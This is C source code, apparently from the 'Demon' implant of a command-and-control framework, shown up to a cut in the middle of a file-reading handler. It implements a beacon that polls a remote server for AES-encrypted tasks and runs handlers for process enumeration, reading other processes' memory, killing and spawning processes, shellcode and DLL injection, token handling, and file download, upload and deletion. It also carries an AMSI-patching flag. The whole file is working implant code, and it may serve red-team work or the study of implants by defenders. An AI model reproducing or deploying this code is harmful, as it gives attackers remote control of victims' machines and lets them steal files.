#include <Demon.h>

#include <Common/Macros.h>

#include <Core/Command.h>
#include <Core/Token.h>
#include <Core/Package.h>
#include <Core/MiniStd.h>
#include <Core/Transport.h>
#include <Core/SleepObf.h>

#include <Loader/CoffeeLdr.h>
#include <Loader/ObjectApi.h>
#include <Inject/Inject.h>

BOOL AmsiPatched = FALSE;

#define DEMON_COMMAND_SIZE  ( sizeof( DemonCommands ) / sizeof ( DemonCommands[ 0 ] ) )

DEMON_COMMAND DemonCommands[] = {
        { .ID = DEMON_COMMAND_SLEEP,                    .Function = CommandSleep                    },
        { .ID = DEMON_COMMAND_CHECKIN,                  .Function = CommandCheckin                  },
        { .ID = DEMON_COMMAND_JOB,                      .Function = CommandJob                      },
        { .ID = DEMON_COMMAND_PROC,                     .Function = CommandProc                     },
        { .ID = DEMON_COMMAND_PROC_LIST,                .Function = CommandProcList                 },
        { .ID = DEMON_COMMAND_PROC_KILL,                .Function = CommandProcKill                 },
        { .ID = DEMON_COMMAND_FS,                       .Function = CommandFS                       },
        { .ID = DEMON_COMMAND_INLINE_EXECUTE,           .Function = CommandInlineExecute            },
        { .ID = DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE,  .Function = CommandAssemblyInlineExecute    },
        { .ID = DEMON_COMMAND_ASSEMBLY_VERSIONS,        .Function = CommandAssemblyListVersion      },
        { .ID = DEMON_COMMAND_CONFIG,                   .Function = CommandConfig                   },
        { .ID = DEMON_COMMAND_SCREENSHOT,               .Function = CommandScreenshot               },
        { .ID = DEMON_COMMAND_PIVOT,                    .Function = CommandPivot                    },
        { .ID = DEMON_COMMAND_NET,                      .Function = CommandNet                      },
        { .ID = DEMON_COMMAND_INJECT_DLL,               .Function = CommandInjectDLL                },
        { .ID = DEMON_COMMAND_INJECT_SHELLCODE,         .Function = CommandInjectShellcode          },
        { .ID = DEMON_COMMAND_SPAWN_DLL,                .Function = CommandSpawnDLL                 },
        { .ID = DEMON_COMMAND_TOKEN,                    .Function = CommandToken                    },
        { .ID = DEMON_EXIT,                             .Function = CommandExit                     },
};

VOID CommandDispatcher( VOID )
{
    PPACKAGE Package        = { 0 };
    PARSER   Parser         = { 0 };
    LPVOID   DataBuffer     = NULL;
    UINT32   DataBufferSize = 0;
    PARSER   TaskParser     = { 0 };
    LPVOID   TaskBuffer     = NULL;
    UINT32   TaskBufferSize = 0;
    UINT32   CommandID      = 0;
    UINT32   TaskID         = 0;
    BOOL     AlreadyDec     = FALSE;
    BOOL     FoundCommand   = FALSE;

    PRINTF( "Session ID => %x\n", Instance->Session.DemonID );

    do
    {
        if ( ! Instance->Session.Connected )
            return;

        DxSleep( Instance->Config.Sleeping * 1000 );

        AlreadyDec  = FALSE;
        Package     = PackageCreate( DEMON_COMMAND_GET_JOB );

        PackageAddInt32( Package, Instance->Session.DemonID );
        PackageTransmit( Package, &DataBuffer, &DataBufferSize );

        if ( DataBuffer && DataBufferSize > 0 )
        {
            ParserNew( &Parser, DataBuffer, DataBufferSize );
            do
            {
                CommandID  = ParserGetInt32( &Parser );
                TaskID     = ParserGetInt32( &Parser );
                TaskBuffer = ParserGetBytes( &Parser, &TaskBufferSize );

                if ( CommandID != DEMON_COMMAND_NO_JOB )
                {
                    PRINTF( "Task => CommandID:[%d : %x] TaskID:[%x] TaskBuffer:[%x : %d]\n", CommandID, CommandID, TaskID, TaskBuffer, TaskBufferSize )
                    if ( TaskBufferSize != 0 )
                    {
                        ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );

                        if ( ! AlreadyDec )
                        {
                            ParserDecrypt( &TaskParser, Instance->Config.AES.Key, Instance->Config.AES.IV );
                            AlreadyDec = TRUE;
                        }
                    }

                    FoundCommand = FALSE;
                    for ( UINT32 FunctionCounter = 0; FunctionCounter < DEMON_COMMAND_SIZE; FunctionCounter++ )
                    {
                        if ( DemonCommands[ FunctionCounter ].ID == CommandID )
                        {
                            DemonCommands[ FunctionCounter ].Function( &TaskParser );
                            FoundCommand = TRUE;
                            break;
                        }
                    }

                    if ( ! FoundCommand )
                        PUTS( "Command not found !!" )
                }

            } while ( Parser.Length > 4 );

            MemSet( DataBuffer, 0, DataBufferSize );
            Instance->Win32.LocalFree( *( PVOID* ) DataBuffer );
            DataBuffer = NULL;

            ParserDestroy( &Parser );
        }
        else
        {
#ifdef TRANSPORT_HTTP
            PUTS( "TransportSend: Failed" )
            break;
#endif
        }

        // Check if we have something in our Pivots connection and sends back the output from the pipes
        PivotCollectOutput();

    } while ( TRUE );

    Instance->Session.Connected = FALSE;

    PUTS( "Out of while loop" )
}

VOID CommandCheckin( VOID )
{
    PUTS( "Checkin" )

    PPACKAGE Package = PackageCreate( DEMON_COMMAND_CHECKIN );

    TransportInit( Package );

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandSleep( PPARSER DataArgs )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_SLEEP );

    Instance->Config.Sleeping = ParserGetInt32( DataArgs );
    PRINTF( "Instance->Sleeping: [%d]\n", Instance->Config.Sleeping );

    PackageAddInt32( Package, Instance->Config.Sleeping );
    PackageTransmit( Package, NULL, NULL );
}

VOID CommandJob( PPARSER Parser )
{
    PUTS( "Job" )
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_JOB );
    DWORD    Command = ParserGetInt32( Parser );

    PackageAddInt32( Package, Command );

    switch ( Command )
    {
        case 0x1: // list
        {
            PUTS( "Job::list" )
            PJOB_DATA JobList = Instance->Jobs;

            do {
                if ( JobList )
                {
                    PRINTF( "Job => JobID:[%d] Type:[%d] State:[%d]", JobList->JobID, JobList->Type, JobList->State )

                    PackageAddInt32( Package, JobList->JobID );
                    PackageAddInt32( Package, JobList->Type );
                    PackageAddInt32( Package, JobList->State );

                    JobList = JobList->Next;
                } else
                    break;

            } while ( TRUE );

            break;
        }

        case 0x2: // suspend
        {
            PUTS( "Job::suspend" )
            DWORD JobID   = ParserGetInt32( Parser );
            BOOL  Success = JobSuspend( JobID );

            PRINTF( "JobID:[%d] Success:[%d]", JobID, Success )

            PackageAddInt32( Package, JobID   );
            PackageAddInt32( Package, Success );

            break;
        }

        case 0x3: // resume
        {
            PUTS( "Job::resume" )
            DWORD JobID   = ParserGetInt32( Parser );
            BOOL  Success = JobResume( JobID );

            PackageAddInt32( Package, JobID   );
            PackageAddInt32( Package, Success );

            break;
        }

        case 0x4: // kill & remove
        {
            PUTS( "Job::kill" )
            DWORD JobID   = ParserGetInt32( Parser );
            BOOL  Success = JobKill( JobID );

            PackageAddInt32( Package, JobID   );
            PackageAddInt32( Package, Success );

            break;
        }
    }

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandProc( PPARSER DataArgs )
{
    SHORT       SubCommand  = ( SHORT ) ParserGetInt32( DataArgs );
    PPACKAGE    Package     = PackageCreate( DEMON_COMMAND_PROC );
    NTSTATUS    NtStatus    = STATUS_SUCCESS;

    PackageAddInt32( Package, SubCommand );

    switch ( SubCommand )
    {
        case 2: PUTS("Proc::Modules")
        {
            PROCESS_BASIC_INFORMATION ProcessBasicInfo = { 0 };
            UINT32                    ProcessID        = 0;
            HANDLE                    hProcess         = NULL;
            HANDLE                    hToken           = NULL;
            NTSTATUS                  NtStatus         = STATUS_SUCCESS;
            CLIENT_ID                 ProcClientID     = { 0, 0 };
            OBJECT_ATTRIBUTES         ObjAttr          = { sizeof( OBJECT_ATTRIBUTES ) };

            if ( DataArgs->Length > 0 )
                ProcessID = ParserGetInt32( DataArgs );
            else
                ProcessID = Instance->Session.PID;

            ProcClientID.UniqueProcess = ProcessID;

            hProcess = ProcessOpen( ProcessID, PROCESS_ALL_ACCESS );
            Instance->Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken );

            NtStatus = Instance->Syscall.NtQueryInformationProcess( hProcess, ProcessBasicInformation, &ProcessBasicInfo, sizeof( PROCESS_BASIC_INFORMATION ), 0 );
            if ( NT_SUCCESS( NtStatus ) )
            {
                PPEB_LDR_DATA           LoaderData              = NULL;
                PLIST_ENTRY             ListHead, ListEntry     = NULL;
                SIZE_T                  Size                    = 0;
                LDR_DATA_TABLE_ENTRY    CurrentModule           = { 0 };
                WCHAR                   ModuleNameW[ MAX_PATH ] = { 0 };
                CHAR                    ModuleName[ MAX_PATH ]  = { 0 };

                PackageAddInt32( Package, ProcessID );

                if ( NT_SUCCESS( Instance->Syscall.NtReadVirtualMemory( hProcess, &ProcessBasicInfo.PebBaseAddress->Ldr, &LoaderData, sizeof( PPEB_LDR_DATA ), &Size ) ) )
                {
                    ListHead = & LoaderData->InMemoryOrderModuleList;

                    Size = 0;
                    if ( NT_SUCCESS( Instance->Syscall.NtReadVirtualMemory( hProcess, &LoaderData->InMemoryOrderModuleList.Flink, &ListEntry, sizeof( PLIST_ENTRY ), NULL ) ) )
                    {
                        while ( ListEntry != ListHead )
                        {
                            if ( NT_SUCCESS( Instance->Syscall.NtReadVirtualMemory( hProcess, CONTAINING_RECORD( ListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks ), &CurrentModule, sizeof( CurrentModule ), NULL ) ) )
                            {
                                Instance->Syscall.NtReadVirtualMemory( hProcess, CurrentModule.FullDllName.Buffer, &ModuleNameW, CurrentModule.FullDllName.Length, &Size );

                                if ( CurrentModule.FullDllName.Length > 0 )
                                {
                                    Size = WCharStringToCharString( ModuleName, ModuleNameW, CurrentModule.FullDllName.Length );

                                    PackageAddBytes( Package, ModuleName, Size );
                                    PackageAddInt32( Package, ( UINT32 ) CurrentModule.DllBase );
                                }

                                MemSet( ModuleNameW, 0, MAX_PATH );
                                MemSet( ModuleName, 0, MAX_PATH );

                                ListEntry = CurrentModule.InMemoryOrderLinks.Flink;
                            }
                        }
                    }
                }
            }

            if ( hProcess )
                Instance->Win32.NtClose( hProcess );

            if ( hToken )
                Instance->Win32.NtClose( hToken );

            break;
        }

        case 3: PUTS("Proc::Grep")
            {
            PSYSTEM_PROCESS_INFORMATION ProcessInformationList = NULL;

            UINT32  ProcessSize          = 0;
            PCHAR   ProcessName          = NULL;
            SIZE_T  Size                 = 1 << 18;
            SIZE_T  Required             = 0;
            CHAR    ProcName[ MAX_PATH ] = { 0 };
            UINT32  ProcNameSize         = 0;
            PCHAR   ProcUserName         = NULL;
            UINT32  ProcUserSize         = 0;

            ProcessName = ParserGetBytes( DataArgs, &ProcessSize );

            NtStatus = Instance->Syscall.NtAllocateVirtualMemory( NtCurrentProcess() , &ProcessInformationList, 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
            if ( NT_SUCCESS( NtStatus ) )
            {
                if ( Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, Size, &Required ) == STATUS_BUFFER_TOO_SMALL )
                {
                    Size = Required + ( 1 << 14 );

                    Instance->Syscall.NtAllocateVirtualMemory( NtCurrentProcess(), &ProcessInformationList, 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
                    Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, Size, &Required );
                }

                while ( TRUE )
                {
                    ProcNameSize = WCharStringToCharString( ProcName, ProcessInformationList->ImageName.Buffer, ProcessInformationList->ImageName.Length );
                    INT32 MemRet = MemCompare( ProcName, ProcessName, ProcessSize );

                    if ( MemRet == 0 )
                    {
                        CLIENT_ID   ProcClientID    = { ProcessInformationList->UniqueProcessId, 0 };
                        HANDLE      hProcess        = NULL;
                        HANDLE      hToken          = NULL;
                        OBJECT_ATTRIBUTES ObjAttr   = { sizeof( OBJECT_ATTRIBUTES ) };

                        Instance->Syscall.NtOpenProcess( &hProcess, PROCESS_ALL_ACCESS, &ObjAttr, &ProcClientID );
                        Instance->Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken );

                        ProcUserName = TokenGetUserDomain( hToken, &ProcUserSize );

                        PackageAddBytes( Package, ProcName, ProcNameSize );
                        PackageAddInt32( Package, ( UINT32 ) ProcessInformationList->UniqueProcessId  );
                        PackageAddInt32( Package, ( UINT32 ) ProcessInformationList->InheritedFromUniqueProcessId );
                        PackageAddBytes( Package, ProcUserName, ProcUserSize );
                        PackageAddInt32( Package, ProcessIsWow( hProcess ) ? 86 : 64 );

#ifdef DEBUG
                        if ( ProcessInformationList->UniqueProcessId != Instance->Session.PID )
#endif
                            Instance->Win32.NtClose( hProcess );

                        if ( hToken )
                            Instance->Win32.NtClose( hToken );

                        MemSet( ProcUserName, 0, ProcUserSize );
                        if ( ProcUserName )
                            Instance->Win32.LocalFree( ProcUserName );

                    }

                    if ( ProcessInformationList->NextEntryOffset == 0 )
                        break;

                    ProcessInformationList = ( PSYSTEM_PROCESS_INFORMATION ) ( ( PBYTE ) ProcessInformationList + ProcessInformationList->NextEntryOffset );
                }
            }

            break;
        }
        case 4: PUTS( "Proc::Create" )
        {
            // TODO: finish this
            PROCESS_INFORMATION ProcessInfo     = { 0 };
            UINT32              ProcessSize     = 0;
            UINT32              ProcessArgsSize = 0;
            UINT32              ProcessState    = ParserGetInt32( DataArgs );
            PCHAR               Process         = ParserGetBytes( DataArgs, &ProcessSize );
            PCHAR               ProcessArgs     = ParserGetBytes( DataArgs, &ProcessArgsSize );
            BOOL                ProcessPiped    = ParserGetInt32( DataArgs );
            BOOL                ProcessVerbose  = ParserGetInt32( DataArgs );

            if ( ProcessSize == 0 )
                Process = NULL;
            else
                Process[ ProcessSize ] = 0;

            if ( ProcessArgsSize == 0 )
                ProcessArgs = NULL;
            else
                ProcessArgs[ ProcessArgsSize ] = 0;

            PRINTF( "Process State   : %d\n", ProcessState );
            PRINTF( "Process         : %s [%d]\n", Process, ProcessSize );
            PRINTF( "Process Args    : %s [%d]\n", ProcessArgs, ProcessArgsSize );
            PRINTF( "Process Piped   : %s [%d]\n", ProcessPiped ? "TRUE" : "FALSE", ProcessPiped );
            PRINTF( "Process Verbose : %s [%d]\n", ProcessVerbose ? "TRUE" : "FALSE", ProcessVerbose );

            // TODO: make it optional to choose process arch
            // TODO: cleanup process info
            if ( ! ProcessCreate( TRUE, Process, ProcessArgs, ProcessState, &ProcessInfo, ProcessPiped, NULL ) )
            {
                PackageDestroy( Package );
                return;
            }
            else
            {
                if ( ProcessVerbose )
                    PackageAddInt32( Package, ProcessInfo.dwProcessId );

                PRINTF( "Successful spawned process: %d\n", ProcessInfo.dwProcessId );
            }

            break;
        }

        case 5: PUTS( "Proc::BlockDll" )
        {
            UINT32 BlockOnOrOff = ParserGetInt32( DataArgs );

            Instance->Config.Process.BlockDll = ( BOOL ) BlockOnOrOff;
            PackageAddInt32( Package, BlockOnOrOff );

            break;
        }

        case 6: PUTS( "Proc::Memory" )
        {
            DWORD                       ProcessID   = ParserGetInt32( DataArgs );
            DWORD                       QueryProtec = ParserGetInt32( DataArgs );
            MEMORY_BASIC_INFORMATION    MemInfo     = {};
            LPVOID                      Offset      = 0;
            SIZE_T                      Result      = 0;
            HANDLE                      hProcess    = NULL;
            OBJECT_ATTRIBUTES           ObjAttr     = { 0 };
            CLIENT_ID                   ClientID    = { 0 };

            ClientID.UniqueProcess = ProcessID;
            if ( NT_SUCCESS( Instance->Syscall.NtOpenProcess( &hProcess, PROCESS_ALL_ACCESS, &ObjAttr, &ClientID ) ) )
            {
                PackageAddInt32( Package, ProcessID );
                PackageAddInt32( Package, QueryProtec );

                while ( NT_SUCCESS( Instance->Syscall.NtQueryVirtualMemory( hProcess, Offset, MemoryBasicInformation, &MemInfo, sizeof( MemInfo ), &Result ) ) )
                {
                    Offset = C_PTR( U_PTR( MemInfo.BaseAddress ) + MemInfo.RegionSize );

                    if ( MemInfo.Type != MEM_FREE )
                    {
                        if ( MemInfo.AllocationBase != 0 )
                        {
                            if ( QueryProtec == 0 )
                            {
                                // Since the Protection to query isn't specified we just list every memory region
                                PackageAddInt32( Package, MemInfo.BaseAddress );
                                PackageAddInt32( Package, MemInfo.RegionSize );
                                PackageAddInt32( Package, MemInfo.AllocationProtect );
                                PackageAddInt32( Package, MemInfo.State );
                                PackageAddInt32( Package, MemInfo.Type );
                            }
                            else
                            {
                                if ( QueryProtec == MemInfo.AllocationProtect )
                                {
                                    PRINTF( "Search for memory region: %d\n", QueryProtec )
                                    // Add found memory region with specified memory protection
                                    PackageAddInt32( Package, MemInfo.BaseAddress );
                                    PackageAddInt32( Package, MemInfo.RegionSize );
                                    PackageAddInt32( Package, MemInfo.AllocationProtect );
                                    PackageAddInt32( Package, MemInfo.State );
                                    PackageAddInt32( Package, MemInfo.Type );
                                }
                            }
                        }
                    }
                }

                Offset = NULL;
            }
        }

        case 7: PUTS( "Proc::Kill" )
        {
            DWORD             dwProcessID = ParserGetInt32( DataArgs );
            HANDLE            hProcess    = NULL;
            CLIENT_ID         ClientID    = { dwProcessID, 0 };
            OBJECT_ATTRIBUTES ObjectAttr  = { sizeof( OBJECT_ATTRIBUTES ) };
            NTSTATUS          NtStatus    = STATUS_SUCCESS;

            NtStatus = Instance->Syscall.NtOpenProcess( &hProcess, PROCESS_TERMINATE, &ObjectAttr, &ClientID );
            if ( NT_SUCCESS( NtStatus ) )
                Instance->Win32.TerminateProcess( hProcess, 0 );

            PackageAddInt32( Package, NT_SUCCESS( NtStatus ) );
            PackageAddInt32( Package, dwProcessID );

            Instance->Win32.NtClose( hProcess );
            hProcess = NULL;

            break;
        }

    }

    // TODO: handle error
    PackageTransmit( Package, NULL, NULL );
}


VOID CommandProcList( PPARSER Parser )
{
    PSYSTEM_PROCESS_INFORMATION ProcessInformationList  = NULL;
    PPACKAGE                    Package                 = NULL;
    ULONG                       ListSize                = 1 << 18;
    ULONG                       Required                = 0;
    NTSTATUS                    NtStatus                = STATUS_SUCCESS;
    DWORD                       ProcessUI               = 0;

    Package                = PackageCreate( DEMON_COMMAND_PROC_LIST );
    ProcessUI              = ParserGetInt32( Parser );
    ProcessInformationList = Instance->Win32.LocalAlloc( LPTR, ListSize );

    PackageAddInt32( Package, ProcessUI );

    NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, ListSize, &Required );
    if ( ! NT_SUCCESS( NtStatus ) )
    {
        if ( NtStatus == STATUS_BUFFER_TOO_SMALL )
        {
            Instance->Win32.LocalFree( ProcessInformationList );

            ListSize               += Required;
            ProcessInformationList =  Instance->Win32.LocalAlloc( LPTR, ListSize );

	    if ( ProcessInformationList != NULL )
	    {
        	NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, ListSize, &Required);
            }
            else
            {
        	PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
            	goto LEAVE;
       	    }
            if ( ! NT_SUCCESS( NtStatus ) )
            {
                PUTS( "NtQuerySystemInformation: Failed" )
                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
                goto LEAVE;
            }
        }
        if ( NtStatus == STATUS_INFO_LENGTH_MISMATCH ){
        	
        	do
        	{
		    Instance->Win32.LocalFree( ProcessInformationList );

		    ListSize               += Required;
		    ProcessInformationList =  Instance->Win32.LocalAlloc( LPTR, ListSize );
		    if ( ProcessInformationList != NULL )
		    {
        	    	NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, ListSize, &Required);
        	    }
        	    else
        	    {
        	        PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
            		goto LEAVE;
        	    }
        	}
        	while ( NtStatus == STATUS_INFO_LENGTH_MISMATCH );
        }
        else
        {
            PUTS( "NtQuerySystemInformation: Failed" )
            PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
            goto LEAVE;
        }
    }

    while ( TRUE )
    {
        PCHAR             ProcessUser = NULL;
        DWORD             ProcessID   = ProcessInformationList->UniqueProcessId;
        HANDLE            hToken      = NULL;
        DWORD             UserSize    = 0;
        HANDLE            hProcess    = NULL;
        CLIENT_ID         ClientID    = { ProcessID, 0 };
        OBJECT_ATTRIBUTES ObjAttr     = { sizeof( OBJECT_ATTRIBUTES ) };

        Instance->Syscall.NtOpenProcess( &hProcess, PROCESS_ALL_ACCESS, &ObjAttr, &ClientID );
        Instance->Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken );

        ProcessUser = TokenGetUserDomain( hToken, &UserSize );

        PackageAddBytes( Package, ProcessInformationList->ImageName.Buffer, ProcessInformationList->ImageName.Length );
        PackageAddInt32( Package, ProcessID );
        PackageAddInt32( Package, ProcessIsWow( hProcess ) );
        PackageAddInt32( Package, ProcessInformationList->InheritedFromUniqueProcessId );
        PackageAddInt32( Package, ProcessInformationList->SessionId );
        PackageAddInt32( Package, ProcessInformationList->NumberOfThreads );
        PackageAddBytes( Package, ProcessUser, UserSize );

#ifdef DEBUG
        if ( ProcessID != Instance->Session.PID )
            Instance->Win32.NtClose( hProcess );
#else
        Instance->Win32.NtClose( hProcess );
#endif

        if ( hToken )
            Instance->Win32.NtClose( hToken );

        MemSet( ProcessUser, 0, UserSize );
        if ( ProcessUser )
        {
            Instance->Win32.LocalFree( ProcessUser );
            ProcessUser = NULL;
        }

        if ( ! ProcessInformationList->NextEntryOffset )
            break;

        ProcessInformationList = ( PSYSTEM_PROCESS_INFORMATION ) ( ( PBYTE ) ProcessInformationList + ProcessInformationList->NextEntryOffset );
        PUTS( "Next list" )
    }

    PUTS( "Send Package" )
    PackageTransmit( Package, NULL, NULL );

LEAVE:
    PackageDestroy( Package );
}

// TODO: move this to the Proc Function Module
VOID CommandProcKill( PPARSER DataArgs )
{

}

VOID CommandFS( PPARSER DataArgs )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_FS );
    DWORD    Command = ParserGetInt32( DataArgs );

    PackageAddInt32( Package, Command );

    switch ( Command )
    {
        case 1:
        {
            PUTS( "FS::Dir" )

            WIN32_FIND_DATA FindData      = { 0 };
            PCHAR           Path          = NULL;
            DWORD           PathSize      = 0;
            UCHAR           T[ MAX_PATH ] = { 0 };
            HANDLE          hFile         = NULL;
            ULARGE_INTEGER  FileSize      = { 0 };
            SYSTEMTIME      FileTime      = { 0 };
            SYSTEMTIME      SystemTime    = { 0 };
            DWORD           Return        = 0;
            BOOL            FileExplorer  = FALSE;

            FileExplorer     = ParserGetInt32( DataArgs );
            Path             = ParserGetBytes( DataArgs, &PathSize );
            Path[ PathSize ] = NULL;

            PRINTF( "FileExplorer: %s [%d]\n", FileExplorer ? "TRUE" : "FALSE", FileExplorer )
            PRINTF( "Path        : %s\n", Path )

            PackageAddInt32( Package, FileExplorer );

            if ( Path[ 0 ] == '.' )
            {
                if ( ! ( Return = Instance->Win32.GetCurrentDirectoryA( MAX_PATH, &T ) ) )
                {
                    PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                }
                else
                    PackageAddBytes( Package, T, Return );
            }
            else
            {
                PackageAddBytes( Package, Path, PathSize );
            }

            hFile = Instance->Win32.FindFirstFileA( Path, &FindData );
            if ( hFile == INVALID_HANDLE_VALUE )
            {
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                Instance->Win32.FindClose( hFile );

                PUTS( "LEAVE" )
                goto LEAVE;
            }

            do
            {
                Instance->Win32.FileTimeToSystemTime( &FindData.ftLastAccessTime, &FileTime );
                Instance->Win32.SystemTimeToTzSpecificLocalTime( 0, &FileTime, &SystemTime );

                if ( FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
                {
                    PackageAddInt32( Package, TRUE );
                    PackageAddInt64( Package, 0 );
                }
                else
                {
                    FileSize.HighPart = FindData.nFileSizeHigh;
                    FileSize.LowPart  = FindData.nFileSizeLow;

                    PackageAddInt32( Package, FALSE );
                    PackageAddInt64( Package, FileSize.QuadPart );
                }

                PackageAddInt32( Package, FileTime.wDay );
                PackageAddInt32( Package, FileTime.wMonth );
                PackageAddInt32( Package, FileTime.wYear );
                PackageAddInt32( Package, SystemTime.wSecond );
                PackageAddInt32( Package, SystemTime.wMinute );
                PackageAddInt32( Package, SystemTime.wHour );
                PackageAddBytes( Package, FindData.cFileName, StringLengthA( FindData.cFileName ) );
            }
            while ( Instance->Win32.FindNextFileA( hFile, &FindData ) );

            PUTS( "Close File Handle" )
            Instance->Win32.FindClose( hFile );

            break;
        }

        case 2:
        {
            PUTS( "FS::Download" )

            DWORD  FileSize = 0;
            DWORD  Read     = 0;
            DWORD  NameSize = 0;
            PCHAR  FileName = ParserGetBytes( DataArgs, &NameSize );
            HANDLE hFile    = NULL;
            PVOID  Content  = NULL;

            FileName[ NameSize ] = 0;

            PRINTF( "FileName => %s", FileName )

            hFile = Instance->Win32.CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
            if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
            {
                PUTS( "CreateFileA: Failed" )
                SEND_WIN32_BACK
                goto CleanupDownload;
            }

            FileSize = Instance->Win32.GetFileSize( hFile, 0 );
            Content  = Instance->Win32.LocalAlloc( LPTR, FileSize );

            if ( ! Instance->Win32.ReadFile( hFile, Content, FileSize, &Read, NULL ) )
            {
                PUTS( "ReadFile: Failed" )
                SEND_WIN32_BACK
                goto CleanupDownload;
            }

            PackageAddBytes( Package, FileName, NameSize );
            PackageAddBytes( Package, Content,  FileSize );

        CleanupDownload:
            if ( hFile )
            {
                Instance->Win32.NtClose( hFile );
                hFile = NULL;
            }

            if ( Content )
            {
                MemSet( Content, 0, FileSize );
                Instance->Win32.LocalFree( Content );
                Content = NULL;
            }

            break;
        }

        case 3:
        {
            PUTS( "FS::Upload" )

            DWORD  FileSize = 0;
            DWORD  NameSize = 0;
            DWORD  Written  = 0;
            PCHAR  FileName = ParserGetBytes( DataArgs, &NameSize );
            PVOID  Content  = ParserGetBytes( DataArgs, &FileSize );
            HANDLE hFile    = NULL;

            FileName[ NameSize ] = 0;

            PRINTF( "FileName => %s (FileSize: %d)", FileName, FileSize )

            hFile = Instance->Win32.CreateFileA( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );

            if ( hFile == INVALID_HANDLE_VALUE )
            {
                PUTS( "CreateFileA: Failed" )
                SEND_WIN32_BACK
                goto CleanupUpload;
            }

            if ( ! Instance->Win32.WriteFile( hFile, Content, FileSize, &Written, NULL ) )
            {
                PUTS( "WriteFile: Failed" )
                SEND_WIN32_BACK
                goto CleanupUpload;
            }

            PackageAddInt32( Package, FileSize );
            PackageAddBytes( Package, FileName, NameSize );

        CleanupUpload:
            Instance->Win32.NtClose( hFile );
            hFile = NULL;

            break;
        }

        case 4:
        {
            PUTS( "FS::Cd" )
            DWORD PathSize = 0;
            PCHAR Path     = ParserGetBytes( DataArgs, &PathSize );

            if ( ! Instance->Win32.SetCurrentDirectoryA( Path ) )
            {
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                goto LEAVE;
            }
            else
            {
                PackageAddBytes( Package, Path, PathSize );
            }

            break;
        }

        case 5:
        {
            PUTS( "FS::Remove" )
            DWORD PathSize = 0;
            PCHAR Path     = ParserGetBytes( DataArgs, &PathSize );
            DWORD dwAttrib = Instance->Win32.GetFileAttributesA( Path );

            if ( dwAttrib != INVALID_FILE_ATTRIBUTES && ( dwAttrib & FILE_ATTRIBUTE_DIRECTORY ) )
            {
                if ( ! Instance->Win32.RemoveDirectoryA( Path ) )
                {
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    goto LEAVE;
                }
                else
                {
                    PackageAddInt32( Package, TRUE );
                }
            }
            else
            {
                if ( ! Instance->Win32.DeleteFileA( Path ) )
                {
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    goto LEAVE;
                }
                else
                {
                    PackageAddInt32( Package, FALSE );
                }
            }
            PackageAddBytes( Package, Path, PathSize );

            break;
        }

        case 6:
        {
            PUTS( "FS::Mkdir" )
            DWORD PathSize = 0;
            PCHAR Path     = ParserGetBytes( DataArgs, &PathSize );

            if ( ! Instance->Win32.CreateDirectoryA( Path, NULL ) )
            {
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                goto LEAVE;
            }

            PackageAddBytes( Package, Path, PathSize );

            break;
        }

        case 9:
        {
            PUTS( "FS::GetPwd" )
            UCHAR Path[ MAX_PATH * 2 ] = { 0 };
            DWORD Return               = 0;

            if ( ! ( Return = Instance->Win32.GetCurrentDirectoryA( MAX_PATH * 2, &Path ) ) )
            {
                PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
            }
            else
                PackageAddBytes( Package, Path, Return );

            break;
        }

        case 10:
        {
            PUTS( "FS::Cat" )

            DWORD  FileSize = 0;
            DWORD  Read     = 0;
            DWORD  NameSize = 0;
            PCHAR  FileName = ParserGetBytes( DataArgs, &NameSize );
            HANDLE hFile    = NULL;
            PVOID  Content  = NULL;

            FileName[ NameSize ] = 0;

            PRINTF( "FileName => %s", FileName )

            hFile = Instance->Win32.CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
            if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
            {
                PUTS( "CreateFileA: Failed" )
                SEND_WIN32_BACK
                goto CleanupCat;
            }

            FileSize = Instance->Win32.GetFileSize( hFile, 0 );
            Content  = Instance->Win32.LocalAlloc( LPTR, FileSize );

            if ( ! Instance->Win32.ReadFile( hFile, Content, FileSize, &Read, NULL ) )
            {
                PUTS( "ReadFile: Failed" )
                SEND_WIN32_BACK
